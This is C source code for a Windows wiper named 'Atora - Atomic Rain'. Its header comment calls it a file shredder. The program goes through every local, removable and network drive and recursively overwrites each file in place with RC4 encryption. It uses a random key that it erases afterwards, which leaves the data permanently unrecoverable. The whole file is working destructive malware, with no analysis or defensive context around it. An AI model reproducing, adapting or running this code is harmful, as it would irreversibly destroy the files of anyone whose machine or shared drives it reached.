/*
  Name:             Atora - Atomic Rain.
  Version:          4.91
  Class:            Files shredder for Windows / Wiper.
  What is he doing: Encrypts all files on all local drives with a cipher RC4
*/
#include <windows.h>
#include <stdio.h>
#include <conio.h>
#include <io.h>

#define _ERROR        -1
#define _ZERO          0
#define _BYTE        256
#define _BUFFER_SIZE 512

void      RC4(unsigned char * data, short int length);

void      WriteTrash(unsigned char * data, short int  length);
void      FindDir(unsigned char * path, unsigned char * mask);
void      Initialized(unsigned char * key, short int length);void      swap (unsigned char * a, unsigned char * b);
short int RandomRange(short int min, short int max);
short int CheckLogicalDisk(short int number_disk);
void      FileEncrypt (unsigned char * filename);
void      GenerateKey(void);
char * expansion    = "*";
char * slash        = "\\";
char * t_one        = ".";
char * t_two        = "..";

short int size_uc   = sizeof(unsigned char); 

unsigned short int  vi, bi;

unsigned char secret_key [_BYTE]        = {_ZERO};
unsigned char buffer     [_BUFFER_SIZE] = {_ZERO};
unsigned char data       [_BYTE]        = {_ZERO};

int main (void) {
 short int i;
 char LOCAL_DISK[] = "+:"; 
 srand(time(_ZERO));
 GenerateKey();

 for (i = 65; i <= 90; i++) {
  if (CheckLogicalDisk(i) == _ZERO) {
   LOCAL_DISK[_ZERO] = i;
   FindDir(LOCAL_DISK, expansion);
  }
 }
 
 memset(secret_key, _ZERO, _BYTE);
 return _ZERO;
}

void FindDir(unsigned char * path, unsigned char * mask) {
 WIN32_FIND_DATA wfd;
 HANDLE hfound;

 char newpath[MAX_PATH]  = {_ZERO};
 char fpath[MAX_PATH]    = {_ZERO};
 char pathfile[MAX_PATH] = {_ZERO};
 char delpath[MAX_PATH]  = {_ZERO};

 strcpy(fpath, path);
 strcat(fpath, slash);
 strcpy(delpath, fpath);
 strcat(fpath, mask);

 if ((hfound = FindFirstFile(fpath, &wfd)) != INVALID_HANDLE_VALUE) {
  do {
   if ((wfd.dwFileAttributes != FILE_ATTRIBUTE_DIRECTORY) && (strcmp(wfd.cFileName, t_two) != _ZERO) && (strcmp(wfd.cFileName, t_one) != _ZERO)) {
    strcpy(pathfile, path);
    strcat(pathfile, slash);
    strcat(pathfile, wfd.cFileName);
	FileEncrypt(pathfile);
   }
  } while (FindNextFile(hfound, &wfd));
 }

 FindClose(hfound);
 strcpy(fpath, path);
 strcat(fpath, slash);
 strcat(fpath, expansion);

 if ((hfound = FindFirstFile(fpath, &wfd)) != INVALID_HANDLE_VALUE) {
  do {
   if ((wfd.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY) && (strcmp(wfd.cFileName, t_two) != _ZERO) && (strcmp(wfd.cFileName, t_one) != _ZERO)) {
    strcpy(newpath, path);
    strcat(newpath, slash);
    strcat(newpath, wfd.cFileName);
    FindDir(newpath, mask);
   }
  } while (FindNextFile(hfound, &wfd));
 }
 FindClose(hfound);
}

void GenerateKey(void) {
 WriteTrash(data, _BYTE);
 Initialized(data, _BYTE);
 memset(data, _ZERO, _BYTE);
}

short int CheckLogicalDisk(short int number_disk) {
 unsigned char LOGICAL_DISK[] = "+:\\";
 LOGICAL_DISK[_ZERO] = number_disk;

 unsigned char result = GetDriveType(&LOGICAL_DISK[_ZERO]);
 
 if ((result == DRIVE_FIXED) || (result == DRIVE_REMOTE) || (result == DRIVE_REMOVABLE))
  return _ZERO;
 else
  return _ERROR;
}

short int RandomRange(short int min, short int max) {
 return min + rand() % ((max + 1) - min);
}

void WriteTrash(unsigned char * data, short int  length) {
 short int i;

  for (i = _ZERO; i < length; i++)
   data[i] = RandomRange(_ZERO, _BYTE - 1);
}

void FileEncrypt (unsigned char * filename) {
 FILE * f;

  if ((f = fopen(filename, "r+b")) != NULL) {
   fseek(f, _ZERO, SEEK_END);
   long int fsize = ftell(f);
   fseek(f, _ZERO, SEEK_SET);

    if ((fsize != -1L) && (fsize > _ZERO)) {

     long int  position = _ZERO;
     short int realread = _ZERO;

      while (position < fsize) {
       realread = fread(buffer, size_uc, _BUFFER_SIZE, f);

       RC4(buffer, realread);

       fseek(f, position, SEEK_SET);
       fwrite(buffer, size_uc, realread, f);
       fflush(f);

       //memset(buffer, _ZERO, _BUFFER_SIZE);
       position += realread;
      }
	}
   fclose(f);
  }
}

void swap (unsigned char * a, unsigned char * b) {
 unsigned char t = *a;

 *a = *b;
 *b = t;
}

void Initialized(unsigned char * key, short int length) {

 for (vi = _ZERO; vi < _BYTE; vi++)
  secret_key[vi] = vi;

 for (vi = bi = _ZERO; vi < _BYTE; vi++) {
  bi = (bi + key[vi % length] + secret_key[vi]) % _BYTE;
  swap(&secret_key[vi], &secret_key[bi]);
 }

 vi = bi = _ZERO;
}

void RC4(unsigned char * data, short int length) {
 register short int i;
  for (i = _ZERO; i < length; i++) {
   vi = (vi + 1) % _BYTE;
   bi = (bi + secret_key[vi]) % _BYTE;

   swap(&secret_key[vi], &secret_key[bi]);

   data[i] ^= secret_key[(secret_key[vi] + secret_key[bi]) % _BYTE];
  }
}